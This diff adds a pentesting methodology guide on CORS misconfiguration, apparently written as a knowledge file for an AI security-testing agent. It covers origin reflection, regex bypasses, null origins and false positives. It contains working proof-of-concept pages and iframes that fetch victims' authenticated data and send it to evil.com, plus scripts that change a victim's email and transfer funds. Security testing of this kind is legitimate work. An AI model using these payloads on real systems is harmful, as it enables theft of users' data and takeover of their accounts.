@@ -1,0 +1,382 @@
+<cors_misconfiguration_guide>
+<title>CORS MISCONFIGURATION</title>
+
+<critical>Cross-Origin Resource Sharing (CORS) misconfigurations allow attackers to make authenticated cross-origin requests from malicious websites, stealing sensitive data or performing actions on behalf of victims. When combined with Access-Control-Allow-Credentials, reflected origins enable complete session hijacking and data theft from authenticated users.</critical>
+
+<scope>
+- Origin reflection: Access-Control-Allow-Origin mirrors request Origin
+- Credentialed CORS: Allow-Credentials with permissive origins
+- Null origin: Access-Control-Allow-Origin: null accepted
+- Subdomain wildcards: Trusting all subdomains (including compromised ones)
+- Pre-flight bypass: Improper handling of OPTIONS requests
+- Internal API exposure: CORS allowing external access to internal APIs
+- Regex bypass: Flawed origin validation patterns
+</scope>
+
+<methodology>
+1. Identify API endpoints with CORS headers.
+2. Test origin reflection: Send custom Origin header.
+3. Check for credentials: Look for Access-Control-Allow-Credentials: true.
+4. Test null origin: Send Origin: null.
+5. Test subdomain variations and regex bypasses.
+6. Verify sensitive data is accessible cross-origin.
+7. Demonstrate data theft via malicious page.
+</methodology>
+
+<discovery_techniques>
+<identify_cors_endpoints>
+Look for CORS headers in responses:
+- Access-Control-Allow-Origin
+- Access-Control-Allow-Credentials
+- Access-Control-Allow-Methods
+- Access-Control-Allow-Headers
+- Access-Control-Expose-Headers
+
+Common endpoints with CORS:
+- API endpoints (/api/*)
+- User data endpoints (/me, /profile, /account)
+- Authentication endpoints
+- Data export/download endpoints
+- WebSocket handshake endpoints
+</identify_cors_endpoints>
+
+<test_origin_reflection>
+Basic reflection test:
+```http
+GET /api/user HTTP/1.1
+Host: target.com
+Origin: https://evil.com
+Cookie: session=xxx
+
+# Check response for:
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+```
+
+Origin variations to test:
+- `https://evil.com` - Direct reflection
+- `null` - Null origin
+- `https://target.com.evil.com` - Suffix match
+- `https://eviltarget.com` - Prefix bypass
+- `https://subdomain.target.com` - Subdomain trust
+- `https://TARGET.COM` - Case variation
+- `http://target.com` - Protocol downgrade
+</test_origin_reflection>
+
+<regex_bypass_techniques>
+Common flawed regex patterns:
+```
+# Pattern: /^https?:\/\/.*\.target\.com$/
+# Bypass: https://evil.com#.target.com (fragment)
+# Bypass: https://evil.target.com (attacker registers subdomain-like domain)
+
+# Pattern: /target\.com/
+# Bypass: https://attacker-target.com
+# Bypass: https://target.com.attacker.com
+
+# Pattern: /^https?:\/\/target\.com/
+# Bypass: https://target.com.evil.com
+
+# Pattern allows subdomains without anchoring
+# Bypass: https://anything.target.com.evil.com
+```
+
+Test payloads:
+- `https://target.com.evil.com`
+- `https://evil-target.com`
+- `https://targetXcom.evil.com` (X instead of dot)
+- `https://target.com@evil.com`
+- `https://target.com%60.evil.com` (backtick encoding)
+</regex_bypass_techniques>
+
+<null_origin_testing>
+Null origin sources:
+- Sandboxed iframes: `<iframe sandbox="allow-scripts">`
+- Data URIs: `data:text/html,<script>...</script>`
+- File protocol: `file:///path/to/page.html`
+- Certain redirects
+
+Test:
+```http
+GET /api/user HTTP/1.1
+Host: target.com
+Origin: null
+Cookie: session=xxx
+
+# Vulnerable response:
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+```
+</null_origin_testing>
+</discovery_techniques>
+
+<vulnerability_types>
+<origin_reflection_with_credentials>
+Most severe - attacker origin reflected with credentials:
+```
+Request:
+Origin: https://evil.com
+
+Response:
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+```
+
+Impact: Full authenticated API access from attacker's page
+Exploit: Fetch user data, perform actions, steal tokens
+</origin_reflection_with_credentials>
+
+<null_origin_accepted>
+Allows access from sandboxed/local contexts:
+```
+Request:
+Origin: null
+
+Response:
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+```
+
+Exploit via sandboxed iframe:
+```html
+<iframe sandbox="allow-scripts" src="data:text/html,
+<script>
+fetch('https://target.com/api/user', {credentials: 'include'})
+.then(r => r.json())
+.then(d => fetch('https://evil.com/steal?data='+JSON.stringify(d)));
+</script>">
+</iframe>
+```
+</null_origin_accepted>
+
+<subdomain_trust>
+Trusts all subdomains (XSS on any subdomain = full API access):
+```
+Request:
+Origin: https://xss-vulnerable.target.com
+
+Response:
+Access-Control-Allow-Origin: https://xss-vulnerable.target.com
+Access-Control-Allow-Credentials: true
+```
+
+Attack: Find XSS on any subdomain → access main app API
+</subdomain_trust>
+
+<wildcard_with_credentials_impossible>
+Note: Browsers BLOCK this combination:
+```
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+```
+This is NOT possible - browsers reject credentialed requests with wildcard.
+If you see this, the credentials won't actually be sent.
+</wildcard_with_credentials_impossible>
+</vulnerability_types>
+
+<exploitation>
+<data_theft_poc>
+Attacker's malicious page (https://evil.com):
+```html
+<!DOCTYPE html>
+<html>
+<head><title>Win a Prize!</title></head>
+<body>
+<h1>Click to claim your prize!</h1>
+<script>
+// Steal authenticated user data via CORS misconfiguration
+fetch('https://target.com/api/user', {
+    credentials: 'include'  // Send victim's cookies
+})
+.then(response => response.json())
+.then(data => {
+    // Exfiltrate stolen data
+    fetch('https://evil.com/collect', {
+        method: 'POST',
+        body: JSON.stringify(data)
+    });
+    console.log('Stolen:', data);
+});
+</script>
+</body>
+</html>
+```
+
+Attack flow:
+1. Victim visits attacker page while logged into target.com
+2. JavaScript makes cross-origin request with credentials
+3. Server reflects origin and allows credentials
+4. Victim's data returned and exfiltrated
+</data_theft_poc>
+
+<action_exploitation>
+Perform actions as victim:
+```javascript
+// Change victim's email
+fetch('https://target.com/api/user/email', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({email: 'attacker@evil.com'})
+});
+
+// Transfer funds (if applicable)
+fetch('https://target.com/api/transfer', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({to: 'attacker', amount: 1000})
+});
+```
+</action_exploitation>
+
+<null_origin_exploit>
+Using sandboxed iframe for null origin:
+```html
+<iframe sandbox="allow-scripts allow-forms" srcdoc="
+<script>
+fetch('https://target.com/api/sensitive', {credentials: 'include'})
+.then(r => r.text())
+.then(d => {
+    new Image().src = 'https://evil.com/steal?d=' + encodeURIComponent(d);
+});
+</script>
+"></iframe>
+```
+</null_origin_exploit>
+</exploitation>
+
+<validation>
+1. Confirm origin reflection: Server MUST return attacker origin in ACAO header.
+2. Confirm credentials allowed: Access-Control-Allow-Credentials: true.
+3. Confirm sensitive data accessible: Response contains user data/tokens.
+4. Demonstrate end-to-end: Create working HTML page that steals data.
+5. Verify cookies are sent: Check request includes session cookie.
+6. Test in real browser: Some behaviors only work in actual browsers.
+7. Document exact origin that was reflected (not just "reflection exists").
+</validation>
+
+<false_positives>
+- ACAO: * without credentials (no authenticated access)
+- Origin reflected but Allow-Credentials: false or missing
+- CORS on truly public APIs with no sensitive data
+- Pre-flight only (OPTIONS) without actual request working
+- Internal/development origins that don't help attackers
+- Origin validated but test origin was actually allowlisted
+</false_positives>
+
+<llm_reasoning_errors>
+COMMON AI MISTAKES THAT CAUSE FALSE POSITIVES - AVOID THESE:
+
+1. WILDCARD WITHOUT CREDENTIALS:
+   WRONG: "Access-Control-Allow-Origin: * found, CORS vulnerability"
+   RIGHT: Wildcard alone is NOT a vulnerability:
+          - Browsers block credentials with wildcard
+          - No cookies/auth headers sent
+          - Only exploitable if API has NO authentication
+          Vulnerability requires reflection + credentials for auth APIs.
+
+2. REFLECTION WITHOUT CREDENTIALS:
+   WRONG: "Origin header reflected in ACAO, data theft possible"
+   RIGHT: Reflection alone doesn't allow authenticated access:
+          - Without Allow-Credentials: true, cookies not sent
+          - Only public (non-authenticated) data accessible
+          - This is essentially same as ACAO: *
+          Must have BOTH reflection AND Allow-Credentials: true.
+
+3. PUBLIC API CONFUSION:
+   WRONG: "API allows cross-origin access, CORS misconfiguration"
+   RIGHT: Many APIs are intentionally accessible cross-origin:
+          - Public data APIs
+          - CDN resources
+          - Intentionally shared endpoints
+          - APIs with API key auth (not cookie-based)
+          Vulnerability requires access to SENSITIVE/AUTHENTICATED data.
+
+4. PREFLIGHT VS ACTUAL REQUEST:
+   WRONG: "OPTIONS request shows permissive CORS, vulnerable"
+   RIGHT: Preflight (OPTIONS) alone doesn't prove vulnerability:
+          - Actual request may be blocked
+          - Some browsers behave differently
+          - Must test actual credentialed request
+          Verify with real fetch/XHR including credentials.
+
+5. INTERNAL ORIGINS:
+   WRONG: "Allows https://internal.target.com, subdomain trust issue"
+   RIGHT: Trusting internal/controlled subdomains may be intended:
+          - Application architecture may require this
+          - Same security boundary
+          - Only issue if subdomain is compromisable
+          Focus on attacker-controllable origins.
+
+6. BROWSER TESTING REQUIRED:
+   WRONG: "curl shows ACAO reflected, confirmed exploitable"
+   RIGHT: Browser behavior differs from curl:
+          - CORS is browser-enforced
+          - Some attacks only work in real browsers
+          - Cookie handling varies
+          Test in actual browser for definitive proof.
+</llm_reasoning_errors>
+
+<expanded_false_positives>
+FALSE POSITIVE SCENARIOS - DO NOT REPORT:
+
+1. PERMISSIVE BUT SAFE:
+   - ACAO: * on public APIs (no auth required)
+   - Origin reflected but no Allow-Credentials
+   - CORS on static assets (images, fonts, scripts)
+   - Public data endpoints with no sensitive info
+
+2. INTENTIONAL CONFIGURATION:
+   - Same-organization subdomains trusted
+   - Partner domains explicitly allowlisted
+   - Mobile app origins (if legitimate apps)
+   - Development/staging origins (verify production)
+
+3. NON-EXPLOITABLE:
+   - Allow-Credentials: true but no cookie auth (API key only)
+   - Session bound to other factors (IP, device)
+   - CSRF tokens required for state-changing requests
+   - SameSite=Strict cookies (browser won't send cross-origin)
+
+4. TESTING ARTIFACTS:
+   - Localhost/127.0.0.1 allowed (development only)
+   - Test origins in allowlist
+   - Debug mode CORS settings
+
+5. INCORRECT ANALYSIS:
+   - Confusing Access-Control-Allow-Origin with Access-Control-Request-Headers
+   - Misreading response headers
+   - Testing OPTIONS but not actual methods
+
+6. BROWSER MITIGATIONS:
+   - SameSite cookie attribute preventing cookie transmission
+   - Browser blocking mixed content (HTTPS → HTTP)
+   - Third-party cookie blocking
+</expanded_false_positives>
+
+<impact>
+- Sensitive data theft: User profiles, emails, financial data
+- Session hijacking: Steal tokens, impersonate users
+- Unauthorized actions: Modify settings, transfer funds
+- Account takeover: Change email/password via API
+- Privacy breach: Access private messages, documents
+- Financial fraud: Banking APIs, payment systems
+- Compliance violation: GDPR, HIPAA data exposure
+</impact>
+
+<pro_tips>
+1. ACAO: * + Allow-Credentials: true is browser-blocked, don't report as vuln.
+2. Test with actual browser, not just curl - CORS is browser-enforced.
+3. SameSite=Lax or Strict cookies may prevent exploitation even with CORS issues.
+4. Check for variations: http vs https, www vs non-www, trailing slash.
+5. Null origin is exploitable via sandboxed iframes - test this specifically.
+6. Subdomain trust is only exploitable if you can find XSS on any subdomain.
+7. GraphQL and WebSocket endpoints often have different CORS configs.
+8. Check if CSRF tokens are required - they may mitigate state-changing exploits.
+9. Pre-flight bypass: Simple requests (GET) skip preflight - test these first.
+10. Document the exact reflected origin and demonstrate working exploitation HTML.
+</pro_tips>
+
+<remember>CORS vulnerabilities require BOTH origin reflection (or null/subdomain acceptance) AND Access-Control-Allow-Credentials: true to exploit authenticated endpoints. Wildcard without credentials, or reflection without credentials, only affects truly public unauthenticated APIs. Always demonstrate exploitation with a working HTML page that steals authenticated data.</remember>
+</cors_misconfiguration_guide>
